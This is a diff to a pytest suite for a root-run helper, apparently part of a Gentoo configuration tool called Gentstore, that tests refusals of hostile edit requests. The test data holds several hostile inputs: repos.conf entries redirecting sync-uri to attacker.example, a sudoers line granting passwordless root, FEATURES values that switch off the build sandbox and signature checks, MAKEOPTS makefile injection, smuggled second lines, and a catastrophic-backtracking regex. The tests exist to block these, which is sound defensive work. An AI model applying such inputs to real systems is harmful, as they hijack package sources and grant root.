@@ -265,7 +265,13 @@ def test_replace_line_changes_one_line_and_nothing_else(portage: Path) -> None:
     target.write_text(
         '# tuned for this box\nMAKEOPTS="-j4"\n\n# keep\nFEATURES="ccache"\n', encoding="utf-8"
     )
-    answer = call("replace_line", path=str(target), match=r"^MAKEOPTS=", line='MAKEOPTS="-j28"')
+    answer = call(
+        "replace_line",
+        path=str(target),
+        match_kind="assignment",
+        match_literal="MAKEOPTS",
+        line='MAKEOPTS="-j28"',
+    )
 
     assert answer["ok"] and answer["changed"]
     assert answer["previous"] == 'MAKEOPTS="-j4"'
@@ -279,7 +285,13 @@ def test_replace_line_refuses_when_several_lines_match(portage: Path) -> None:
     original = 'MAKEOPTS="-j4"\nMAKEOPTS="-j8"\n'
     target.write_text(original, encoding="utf-8")
 
-    answer = call("replace_line", path=str(target), match=r"^MAKEOPTS=", line='MAKEOPTS="-j1"')
+    answer = call(
+        "replace_line",
+        path=str(target),
+        match_kind="assignment",
+        match_literal="MAKEOPTS",
+        line='MAKEOPTS="-j1"',
+    )
 
     assert answer["code"] == "ambiguous"
     assert target.read_text(encoding="utf-8") == original
@@ -298,8 +310,9 @@ def test_replace_line_refuses_a_smuggled_second_line(portage: Path) -> None:
     answer = call(
         "replace_line",
         path=str(target),
-        match="^MAKEOPTS=",
-        line='MAKEOPTS="-j8"\nFEATURES="-sandbox"',
+        match_kind="assignment",
+        match_literal="MAKEOPTS",
+        line='MAKEOPTS="-j8"\nUSE="X wayland"',
     )
 
     assert answer["code"] == "multiline"
@@ -311,7 +324,13 @@ def test_replace_line_refuses_when_nothing_matches(portage: Path) -> None:
     target.write_text('USE="X"\n', encoding="utf-8")
     # A line make.conf could hold, so that "nothing matches" is what this test
     # gets to be about rather than the shape of the replacement.
-    answer = call("replace_line", path=str(target), match="^NOPE=", line='USE="X wayland"')
+    answer = call(
+        "replace_line",
+        path=str(target),
+        match_kind="assignment",
+        match_literal="NOPE",
+        line='USE="X wayland"',
+    )
     assert answer["code"] == "no_match"
 
 
@@ -338,7 +357,6 @@ FORBIDDEN_MAKE_CONF = [
     "USE='X' 'Y'",
     'USE="X',
     'USE=X"',
-    "USE=\"X\"\x00",
     "not an assignment at all",
     "# USE=\"X\"",
     "  export USE=\"X\"",
@@ -362,7 +380,9 @@ def test_make_conf_takes_only_the_assignments_gentstore_makes(
     target = portage / "make.conf"
     target.write_text('USE="X"\n', encoding="utf-8")
 
-    answer = call(op, path=str(target), line=line, match="^USE=")
+    answer = call(
+        op, path=str(target), line=line, match_kind="assignment", match_literal="USE"
+    )
 
     assert answer["ok"] is False, answer
     assert answer["code"] == "make_conf_line", answer
@@ -384,6 +404,33 @@ def test_a_line_break_in_a_make_conf_value_is_still_a_line_break(portage: Path) 
 
     assert answer["code"] == "multiline"
     assert target.read_text(encoding="utf-8") == 'USE="X"\n'
+
+
+@pytest.mark.parametrize("op", ["append_line", "replace_line", "remove_line"])
+def test_a_null_byte_is_refused_a_step_earlier_and_for_every_file(
+    portage: Path, op: str
+) -> None:
+    """It used to be a make.conf rule, which left the question unanswered for
+    every other file this program writes.
+
+    "The file already contains that line" is not something anybody can decide
+    about a file with a NUL in it, and none of the four operations has a reason
+    to put one there. Refused in the step that takes the line apart, so it is
+    refused once rather than in four places.
+    """
+    target = portage / "package.use"
+    target.write_text("media-video/mpv vulkan\n", encoding="utf-8")
+
+    answer = call(
+        op,
+        path=str(target),
+        line="app-x/y flag\x00hidden",
+        match_kind="entry",
+        match_literal="app-x/y",
+    )
+
+    assert answer["code"] == "nul_byte", answer
+    assert target.read_bytes() == b"media-video/mpv vulkan\n"
 
 
 def test_replace_line_checks_the_new_line_and_not_only_the_pattern(
@@ -418,7 +465,7 @@ def test_replace_line_checks_the_new_line_and_not_only_the_pattern(
         'ACCEPT_LICENSE="-* @FREE @BINARY-REDISTRIBUTABLE"',
         'VIDEO_CARDS="amdgpu radeonsi"',
         'CPU_FLAGS_X86="aes avx avx2 sse4_2"',
-        'FEATURES="parallel-fetch -sandbox candy"',
+        'FEATURES="parallel-fetch ccache candy"',
         'L10N="pl en pt-BR"',
         'USE=""',
         '\tMAKEOPTS="-j4"',
@@ -772,7 +819,7 @@ def test_the_helper_and_the_interface_agree_on_what_is_editable() -> None:
         ("ACCEPT_LICENSE", "-* @FREE"),
         ("VIDEO_CARDS", "amdgpu radeonsi"),
         ("CPU_FLAGS_X86", "aes avx avx2"),
-        ("FEATURES", "parallel-fetch -sandbox"),
+        ("FEATURES", "parallel-fetch ccache -candy"),
         ("L10N", "pl en pt-BR"),
         ("USE", ""),
     ],
@@ -1122,20 +1169,117 @@ def test_a_bad_keep_refuses_before_the_change_it_was_attached_to(portage: Path) 
     assert target.read_text(encoding="utf-8") == "media-video/mpv vulkan\n"
 
 
-def test_a_match_pattern_longer_than_the_limit_is_refused(portage: Path) -> None:
-    """Nothing in the standard library can time a regular expression out.
+def test_a_regular_expression_from_the_request_is_no_longer_accepted(portage: Path) -> None:
+    """The cap on pattern length was a bound rather than a cure, and not much
+    of a bound: ``^(a+)+$`` is seven characters and runs for ever against a
+    sixty-character line, which an earlier append_line can put in the file.
 
-    The length cap is a bound rather than a cure, and it is worth a test only
-    because the alternative — an unbounded pattern compiled and run as root — has
-    no upper limit on how long it can hold the process.
+    Nothing in the standard library can give a regular expression a deadline,
+    and this process is root, so the answer is not to compile one at all.
     """
     target = portage / "package.use"
     target.write_text("media-video/mpv vulkan\n", encoding="utf-8")
 
-    too_long = "a" * (helper.PATTERN_MAX + 1)
-    answer = call("replace_line", path=str(target), line="a b", match=too_long)
+    answer = call("replace_line", path=str(target), line="x/y flag", match="^(a+)+$")
+
     assert answer["code"] == "bad_pattern"
-    assert call("replace_line", path=str(target), line="x/y flag", match="^media-video/mpv")["ok"]
+    assert "match_kind" in answer["error"]
+    assert target.read_text(encoding="utf-8") == "media-video/mpv vulkan\n"
+
+
+def test_the_literal_is_still_bounded(portage: Path) -> None:
+    target = portage / "package.use"
+    target.write_text("media-video/mpv vulkan\n", encoding="utf-8")
+    answer = call(
+        "replace_line",
+        path=str(target),
+        line="x/y flag",
+        match_kind="entry",
+        match_literal="a" * (helper.PATTERN_MAX + 1),
+    )
+    assert answer["code"] == "bad_pattern"
+
+
+@pytest.mark.parametrize(
+    "literal",
+    ["media-video/mpv", "^(a+)+$", ".*", "a" * 200, "[", "\\", "cat/pkg(", "$^"],
+)
+def test_every_literal_is_an_ordinary_string(portage: Path, literal: str) -> None:
+    """re.escape makes every character of it ordinary, so there is nothing left
+    to craft: whatever arrives is looked for verbatim or not found."""
+    target = portage / "package.use"
+    target.write_text(f"{literal} vulkan\nmedia-video/other x\n", encoding="utf-8")
+
+    answer = call(
+        "replace_line",
+        path=str(target),
+        line="a/b flag",
+        match_kind="entry",
+        match_literal=literal,
+    )
+
+    assert answer["ok"], answer
+    assert answer["previous"] == f"{literal} vulkan"
+
+
+def test_an_unknown_match_kind_is_refused(portage: Path) -> None:
+    target = portage / "package.use"
+    target.write_text("media-video/mpv vulkan\n", encoding="utf-8")
+    answer = call(
+        "replace_line",
+        path=str(target),
+        line="x/y flag",
+        match_kind="whatever",
+        match_literal="media-video/mpv",
+    )
+    assert answer["code"] == "bad_pattern"
+
+
+def test_the_two_kinds_are_anchored(portage: Path) -> None:
+    """A mention inside a comment, or inside another entry's value, is not the
+    line being replaced."""
+    target = portage / "make.conf"
+    target.write_text('# was MAKEOPTS=-j8\nUSE="X"\n', encoding="utf-8")
+
+    answer = call(
+        "replace_line",
+        path=str(target),
+        line='MAKEOPTS="-j1"',
+        match_kind="assignment",
+        match_literal="MAKEOPTS",
+    )
+
+    assert answer["code"] == "no_match"
+    assert target.read_text(encoding="utf-8") == '# was MAKEOPTS=-j8\nUSE="X"\n'
+
+
+def test_the_interface_and_the_helper_agree_on_how_a_line_is_found(portage: Path) -> None:
+    """The seam: what core/confedit.py and core/makeconf.py put in a plan has to
+    be something this program knows how to build a pattern from.
+
+    The file has to exist and hold the variable, or ``plan_set`` returns an
+    ``append_line`` plan with no ``match_kind`` at all and there is nothing to
+    compare — which is how this test spent its first day passing without
+    asserting anything.
+    """
+    from gentstore.core import makeconf  # noqa: PLC0415
+
+    target = portage / "make.conf"
+    target.write_text('MAKEOPTS="-j1"\n', encoding="utf-8")
+    conf = makeconf.load(path=target)
+    plan = makeconf.plan_set(conf, "MAKEOPTS", "-j4")
+
+    assert plan.op == "replace_line"
+    assert plan.match_kind == "assignment"
+    assert plan.match_kind in helper.MATCH_KINDS
+    assert plan.match_literal == "MAKEOPTS"
+
+    # And the request that actually crosses the boundary carries the pair,
+    # never a pattern.
+    request = plan.as_request()
+    assert request["match_kind"] == "assignment"
+    assert request["match_literal"] == "MAKEOPTS"
+    assert "match" not in request
 
 
 # -- where cfg_apply may reach ----------------------------------------------
@@ -1166,3 +1310,527 @@ def test_config_protect_cannot_be_pointed_at_a_directory_others_can_write(
     # and the faked euid says root is asking. That is exactly the shape of the
     # thing being refused.
     assert theirs.resolve() not in helper.protected_roots()
+
+
+# -- what a whole-file write may contain ------------------------------------
+
+
+def test_write_file_refuses_a_file_that_redefines_another_repository(portage: Path) -> None:
+    """Portage reads every file in repos.conf and merges them, so a section
+    repeated in a file read later replaces the earlier definition.
+
+    The path check says "repos.conf, so yes"; it has nothing to say about a file
+    called guru.conf that defines gentoo. That is not adding a repository, it is
+    pointing every package on the system somewhere else, and it arrived on stdin.
+    """
+    target = portage / "repos.conf" / "zzz-guru.conf"
+    answer = call(
+        "write_file",
+        path=str(target),
+        content="[gentoo]\nsync-uri = https://attacker.example/tree.git\n",
+        expect=None,
+    )
+
+    assert answer["ok"] is False
+    assert answer["code"] == "bad_content"
+    assert not target.exists()
+
+
+def test_write_file_refuses_a_default_section(portage: Path) -> None:
+    """[DEFAULT] applies to every other section, including ones in files this
+    program never wrote."""
+    target = portage / "repos.conf" / "guru.conf"
+    answer = call(
+        "write_file",
+        path=str(target),
+        content=(
+            "[DEFAULT]\nsync-uri = https://attacker.example/\n"
+            "\n[guru]\nlocation = /var/db/repos/guru\n"
+        ),
+        expect=None,
+    )
+
+    assert answer["code"] == "bad_content"
+    assert not target.exists()
+
+
+def test_write_file_refuses_a_file_naming_the_main_repository(portage: Path) -> None:
+    target = portage / "repos.conf" / "gentoo.conf"
+    answer = call(
+        "write_file",
+        path=str(target),
+        content="[gentoo]\nsync-uri = https://attacker.example/tree.git\n",
+        expect=None,
+    )
+
+    assert answer["code"] == "bad_content"
+    assert not target.exists()
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        "[guru]\nsync-hooks = /tmp/mine.sh\n",
+        "[guru]\nsync-openpgp-key-path = /tmp/mine.gpg\n",
+        "[guru]\npost-sync = /tmp/mine.sh\n",
+    ],
+)
+def test_write_file_refuses_keys_gentstore_does_not_write(portage: Path, content: str) -> None:
+    """A list of what this application writes, not a list of what looks
+    dangerous — the same rule as LINE_EDITABLE, one level down."""
+    target = portage / "repos.conf" / "guru.conf"
+    answer = call("write_file", path=str(target), content=content, expect=None)
+    assert answer["code"] == "bad_content"
+    assert not target.exists()
+
+
+def test_write_file_refuses_a_location_others_can_write(
+    portage: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """`location` names the directory Portage reads ebuilds from, and an ebuild
+    is a shell script this machine runs as root while merging."""
+    theirs = tmp_path / "theirs"
+    theirs.mkdir()
+    monkeypatch.setattr(helper.os, "geteuid", lambda: 0)
+
+    target = portage / "repos.conf" / "guru.conf"
+    answer = call(
+        "write_file",
+        path=str(target),
+        content=f"[guru]\nlocation = {theirs}\nsync-type = git\n",
+        expect=None,
+    )
+
+    assert answer["code"] == "bad_content"
+    assert not target.exists()
+
+
+def test_write_file_still_writes_the_definitions_gentstore_makes(portage: Path) -> None:
+    """The refusals above must not have cost the operation its reason to exist."""
+    binrepos = portage / "binrepos.conf"
+    binrepos.mkdir()
+    target = binrepos / "gentoo-binhost.conf"
+    content = binrepos_section_text()
+
+    answer = call("write_file", path=str(target), content=content, expect=None)
+
+    assert answer["ok"] and answer["changed"], answer
+    assert target.read_text(encoding="utf-8") == content
+
+
+def binrepos_section_text() -> str:
+    """What core/binrepos.py actually produces, so the two cannot drift apart."""
+    from gentstore.core import binrepos
+
+    return binrepos.section_text("gentoo-binhost", "https://distfiles.gentoo.org/releases", 1)
+
+
+def test_a_whole_file_write_goes_no_deeper_than_gentstore_does(portage: Path) -> None:
+    nested = portage / "repos.conf" / "nested"
+    nested.mkdir()
+    answer = call(
+        "write_file", path=str(nested / "guru.conf"), content="[guru]\n", expect=None
+    )
+    assert answer["code"] == "not_owned"
+
+
+# -- what a merge has to say about the file it is merging into --------------
+
+
+def test_cfg_apply_merge_requires_an_expectation(portage: Path, tmp_path) -> None:
+    """A merge writes text that arrived in the request. Nothing else in the
+    operation ties that text to anything the user saw — so it has to say what it
+    expects to find, and an accept, whose content is on disk, does not."""
+    target = tmp_path / "etc" / "sudoers"
+    target.write_text("root ALL=(ALL) ALL\n", encoding="utf-8")
+    candidate = tmp_path / "etc" / "._cfg0000_sudoers"
+    candidate.write_text("root ALL=(ALL) ALL\n", encoding="utf-8")
+
+    answer = call(
+        "cfg_apply",
+        path=str(candidate),
+        decision="merge",
+        content="attacker ALL=(ALL) NOPASSWD: ALL\n",
+    )
+
+    assert answer["ok"] is False
+    assert answer["code"] == "bad_request"
+    assert target.read_text(encoding="utf-8") == "root ALL=(ALL) ALL\n"
+    assert candidate.exists()
+
+
+def test_cfg_apply_merge_refuses_when_the_target_moved_on(portage: Path, tmp_path) -> None:
+    target = tmp_path / "etc" / "conf.d"
+    target.write_text("edited by hand\n", encoding="utf-8")
+    candidate = tmp_path / "etc" / "._cfg0000_conf.d"
+    candidate.write_text("new\n", encoding="utf-8")
+
+    answer = call(
+        "cfg_apply",
+        path=str(candidate),
+        decision="merge",
+        content="merged\n",
+        expect="what the diff showed\n",
+    )
+
+    assert answer["code"] == "changed_underfoot"
+    assert target.read_text(encoding="utf-8") == "edited by hand\n"
+
+
+def test_cfg_apply_merge_goes_through_when_it_says_what_it_saw(portage: Path, tmp_path) -> None:
+    target = tmp_path / "etc" / "conf.d"
+    target.write_text("old\n", encoding="utf-8")
+    candidate = tmp_path / "etc" / "._cfg0000_conf.d"
+    candidate.write_text("new\n", encoding="utf-8")
+
+    answer = call(
+        "cfg_apply", path=str(candidate), decision="merge", content="merged\n", expect="old\n"
+    )
+
+    assert answer["ok"], answer
+    assert target.read_text(encoding="utf-8") == "merged\n"
+    assert not candidate.exists()
+
+
+def test_cfg_apply_merge_into_a_file_that_is_not_there_yet(portage: Path, tmp_path) -> None:
+    """`expect: null` means "this file should not exist yet" — the shape a new
+    configuration file arrives in."""
+    candidate = tmp_path / "etc" / "._cfg0000_brand-new"
+    candidate.write_text("new\n", encoding="utf-8")
+
+    answer = call(
+        "cfg_apply", path=str(candidate), decision="merge", content="merged\n", expect=None
+    )
+
+    assert answer["ok"], answer
+    assert (tmp_path / "etc" / "brand-new").read_text(encoding="utf-8") == "merged\n"
+
+
+def test_cfg_apply_refuses_a_directory_others_can_write(
+    portage: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """The rule in _only_root_can_write has to hold where the file really is.
+
+    /etc passes that rule on every machine there has ever been, so asking only
+    about the CONFIG_PROTECT entry answered nothing about a loose directory
+    underneath it — and a loose directory is exactly where somebody who is not
+    root could have put the ``._cfg`` file this operation trusts.
+    """
+    loose = tmp_path / "etc" / "loose"
+    loose.mkdir()
+    loose.chmod(0o777)
+    (loose / "victim.conf").write_text("harmless\n", encoding="utf-8")
+    (loose / "._cfg0000_victim.conf").write_text("planted\n", encoding="utf-8")
+    # The check is deliberately asleep when we are not root; this test is about
+    # what it says when we are.
+    monkeypatch.setattr(helper.os, "geteuid", lambda: 0)
+    monkeypatch.setattr(
+        helper, "_only_root_can_write", lambda path: Path(path) != loose
+    )
+
+    answer = call(
+        "cfg_apply", path=str(loose / "._cfg0000_victim.conf"), decision="accept"
+    )
+
+    assert answer["ok"] is False
+    assert answer["code"] == "unsafe_directory"
+    assert (loose / "victim.conf").read_text(encoding="utf-8") == "harmless\n"
+    assert (loose / "._cfg0000_victim.conf").exists()
+
+
+def test_cfg_apply_still_works_where_only_root_can_write(portage: Path, tmp_path) -> None:
+    """The refusal above must not have cost the operation its reason to exist."""
+    target = tmp_path / "etc" / "fstab"
+    target.write_text("old\n", encoding="utf-8")
+    candidate = tmp_path / "etc" / "._cfg0000_fstab"
+    candidate.write_text("new\n", encoding="utf-8")
+
+    assert call("cfg_apply", path=str(candidate), decision="accept")["ok"]
+    assert target.read_text(encoding="utf-8") == "new\n"
+
+
+# -- the two variables whose value is the question --------------------------
+
+
+@pytest.mark.parametrize(
+    "value",
+    [
+        "-sandbox",
+        "-usersandbox -network-sandbox",
+        "-userpriv",
+        "parallel-fetch -sandbox",
+        "-rsync-verify",
+        "-webrsync-gpg",
+        "-strict",
+        "-collision-protect",
+        "-preserve-libs",
+    ],
+)
+def test_features_may_not_switch_a_protection_off(portage: Path, value: str) -> None:
+    """The nine variables are on the list because they were taken to decide
+    *which packages* get installed rather than *what Portage does*.
+
+    FEATURES does not meet that test, and the character set cannot tell:
+    ``-sandbox`` is ordinary letters and a hyphen. Written once, it takes the
+    walls off every build the machine does afterwards — which is not a package
+    being installed, and not what the dialog in front of this program says.
+    """
+    target = portage / "make.conf"
+    target.write_text('USE="X"\n', encoding="utf-8")
+
+    answer = call("append_line", path=str(target), line=f'FEATURES="{value}"')
+
+    assert answer["code"] == "make_conf_line", answer
+    assert target.read_text(encoding="utf-8") == 'USE="X"\n'
+
+
+@pytest.mark.parametrize(
+    "value", ["ccache", "-candy", "parallel-fetch ccache buildpkg", "sandbox", "test"]
+)
+def test_features_the_settings_screen_offers_still_go_through(
+    portage: Path, value: str
+) -> None:
+    """Turning a protection *on* is always allowed, and a preference either way."""
+    target = portage / "make.conf"
+    target.write_text("# notes\n", encoding="utf-8")
+    assert call("append_line", path=str(target), line=f'FEATURES="{value}"')["ok"]
+
+
+@pytest.mark.parametrize(
+    "value",
+    [
+        "-j1 -f/home/someone/theirs.mk",
+        "-f/tmp/x.mk",
+        "--eval=x",
+        "-j4 --directory=/tmp",
+        "-I/tmp",
+    ],
+)
+def test_makeopts_takes_only_parallelism_options(portage: Path, value: str) -> None:
+    """MAKEOPTS is a command line for make, which emake expands unquoted.
+
+    ``-f`` in it names a makefile, so it replaces the one the ebuild shipped —
+    and every character of that fits the allowed alphabet.
+    """
+    target = portage / "make.conf"
+    target.write_text('USE="X"\n', encoding="utf-8")
+
+    answer = call("append_line", path=str(target), line=f'MAKEOPTS="{value}"')
+
+    assert answer["code"] == "make_conf_line", answer
+    assert target.read_text(encoding="utf-8") == 'USE="X"\n'
+
+
+@pytest.mark.parametrize(
+    "value", ["-j4", "-j4 -l4", "-j16 -l16", "-l4.5", "--jobs=8", "--load-average=4.5"]
+)
+def test_the_makeopts_the_screen_suggests_still_go_through(
+    portage: Path, value: str
+) -> None:
+    target = portage / "make.conf"
+    target.write_text("# notes\n", encoding="utf-8")
+    assert call("append_line", path=str(target), line=f'MAKEOPTS="{value}"')["ok"]
+
+
+def test_what_suggest_makeopts_produces_is_what_the_helper_accepts(portage: Path) -> None:
+    """The screen's own suggestion has to survive the boundary it is written
+    across — otherwise the one value Gentstore proposes is one it refuses."""
+    from gentstore.core import makeconf  # noqa: PLC0415
+
+    target = portage / "make.conf"
+    target.write_text("# notes\n", encoding="utf-8")
+    suggestion = makeconf.suggest_makeopts().value
+
+    line = makeconf.format_line("MAKEOPTS", suggestion)
+    assert call("append_line", path=str(target), line=line)["ok"], suggestion
+
+
+def test_the_helper_and_the_interface_agree_on_features() -> None:
+    """The third copied list, and the same rent as the other two."""
+    from gentstore.core import makeconf  # noqa: PLC0415
+
+    assert helper.FEATURES_OPTIONAL == makeconf.FEATURES_OPTIONAL
+    assert helper.FEATURES_PROTECTIVE == makeconf.FEATURES_PROTECTIVE
+    # No token may be in both: "may be switched off" and "protects something"
+    # are the two halves of one question.
+    assert not (helper.FEATURES_OPTIONAL & helper.FEATURES_PROTECTIVE)
+
+
+@pytest.mark.parametrize(
+    ("name", "value"),
+    [
+        ("FEATURES", "-sandbox"),
+        ("FEATURES", "not-a-real-feature"),
+        ("MAKEOPTS", "-f/tmp/x.mk"),
+        ("MAKEOPTS", "--eval=x"),
+    ],
+)
+def test_the_screen_refuses_what_the_helper_refuses(name: str, value: str) -> None:
+    """The other direction of the seam.
+
+    A stricter helper than the screen it serves is a refusal the user cannot
+    act on; the screen has to say no first, while they are still looking at
+    what they typed.
+    """
+    from gentstore.core import makeconf  # noqa: PLC0415
+
+    assert makeconf.unsafe_value(name, value) is not None
+
+
+# -- what counts as one line ------------------------------------------------
+
+
+@pytest.mark.parametrize(
+    "line",
+    [
+        "app-x/y flag\rsys-apps/portage -rsync-verify",
+        "app-x/y flag\r\nsys-apps/portage -rsync-verify",
+        "app-x/y flag\vsys-apps/portage -rsync-verify",
+        "app-x/y flag\fsys-apps/portage -rsync-verify",
+        "app-x/y flag sys-apps/portage -rsync-verify",
+        "app-x/y flag\u0085sys-apps/portage -rsync-verify",
+        "app-x/y flag\x1csys-apps/portage -rsync-verify",
+    ],
+)
+def test_a_line_another_program_would_read_as_two_is_not_one_line(
+    portage: Path, line: str
+) -> None:
+    """The check was against "\\n", and that is not what a line is to the
+    program that reads these files afterwards.
+
+    portage.util.grablines opens them in universal-newline mode, so a "\\r" in
+    the middle of what this program called one line is a line break to Portage:
+    the request wrote two configuration entries and the preview the user agreed
+    to had shown one.
+    """
+    target = portage / "package.use"
+    target.write_text("media-video/mpv vulkan\n", encoding="utf-8")
+
+    answer = call("append_line", path=str(target), line=line)
+
+    assert answer["code"] == "multiline", answer
+    assert target.read_bytes() == b"media-video/mpv vulkan\n"
+
+
+def test_a_grouped_write_counts_a_line_the_same_way(portage: Path) -> None:
+    """Every entry is checked exactly as if it had arrived on its own."""
+    (portage / "package.use").mkdir()
+    answer = call(
+        "append_lines",
+        entries=[
+            {"path": str(portage / "package.use" / "mpv"), "line": "media-video/mpv vulkan"},
+            {
+                "path": str(portage / "package.use" / "other"),
+                "line": "app-x/y flag\rsys-apps/portage -rsync-verify",
+            },
+        ],
+    )
+
+    assert answer["code"] == "multiline", answer
+    assert answer["error"].startswith("entry 2")
+    assert not (portage / "package.use" / "mpv").exists()
+
+
+def test_what_this_program_calls_a_line_is_what_portage_calls_a_line(
+    portage: Path,
+) -> None:
+    """The two have to agree, so ask the one that decides.
+
+    ``_lines`` used to be ``splitlines()``, which breaks on \\v, \\f, U+0085 and
+    U+2028 as well — none of which Portage treats as a line ending. A file
+    holding one of those had more lines here than it had there, and "exactly
+    one line matches" was then a statement about a different file.
+    """
+    portage_util = pytest.importorskip("portage.util")
+
+    target = portage / "package.use"
+    body = "media-video/mpv vulkan\napp-x/y flag still-the-same-line\nsys-apps/portage x\n"
+    target.write_text(body, encoding="utf-8")
+
+    theirs = [line.rstrip("\n") for line in portage_util.grablines(str(target))]
+    assert helper._lines(helper._read(target)) == theirs
+
+
+def test_the_file_keeps_its_shape_when_a_line_is_replaced(portage: Path) -> None:
+    """Docs/04-privileges.md §4: the rest of the file, comments and blank lines
+    included, is left exactly as it was."""
+    target = portage / "make.conf"
+    body = '# tuned for this box\n\nUSE="X"\n\n# keep this comment\nMAKEOPTS="-j4"\n'
+    target.write_text(body, encoding="utf-8")
+
+    answer = call(
+        "replace_line",
+        path=str(target),
+        line='USE="X wayland"',
+        match_kind="assignment",
+        match_literal="USE",
+    )
+
+    assert answer["ok"], answer
+    assert target.read_text(encoding="utf-8") == body.replace('USE="X"', 'USE="X wayland"')
+
+
+def test_a_line_that_is_already_there_is_recognised_as_already_there(
+    portage: Path,
+) -> None:
+    """The duplicate check compares against _lines, so the two notions of a
+    line have to be the same one or the promise in Docs §4 quietly stops
+    holding."""
+    target = portage / "package.use"
+    target.write_text("media-video/mpv vulkan\n", encoding="utf-8")
+
+    first = call("append_line", path=str(target), line="app-x/y flag")
+    second = call("append_line", path=str(target), line="app-x/y flag")
+
+    assert first["changed"] is True
+    assert second["changed"] is False
+    assert target.read_text(encoding="utf-8").count("app-x/y flag") == 1
+
+
+# -- the contract: one JSON answer, always ----------------------------------
+
+
+def test_a_deeply_nested_request_is_a_refusal_not_a_traceback() -> None:
+    """RecursionError is a RuntimeError, so the sieve in main() never saw it.
+
+    json.loads raises it on deeply nested input, and this program then answered
+    a request with a traceback on stderr and no JSON at all — which the client
+    reads as "no_answer" with an empty message, the least informative outcome
+    there is. The comment above that sieve already said a traceback instead of
+    an answer is a worse bug than whatever caused it.
+    """
+    stdout = io.StringIO()
+    helper.main(io.StringIO("[" * 200_000 + "]" * 200_000), stdout)
+
+    answer = json.loads(stdout.getvalue())
+    assert answer["ok"] is False
+    assert answer["code"] == "bad_json"
+
+
+def test_a_request_larger_than_the_limit_is_refused() -> None:
+    """Standard input is chosen by the caller, who is not obliged to be
+    Gentstore and is talking to a process running as root."""
+    stdout = io.StringIO()
+    payload = '{"op": "backup", "pad": "' + "x" * helper.STDIN_MAX + '"}'
+    helper.main(io.StringIO(payload), stdout)
+
+    answer = json.loads(stdout.getvalue())
+    assert answer["code"] == "too_large"
+
+
+def test_the_answer_is_json_whatever_arrives(portage: Path) -> None:
+    """The whole contract of this program, as one test."""
+    for payload in (
+        "",
+        "not json",
+        "[" * 100_000 + "]" * 100_000,
+        '{"op": "append_line"}',
+        '{"op": "nonsense"}',
+        "[1, 2, 3]",
+        '{"op": "append_line", "path": 7, "line": null}',
+    ):
+        stdout = io.StringIO()
+        helper.main(io.StringIO(payload), stdout)
+        answer = json.loads(stdout.getvalue())
+        assert answer["ok"] is False, payload
+        assert answer["code"], payload
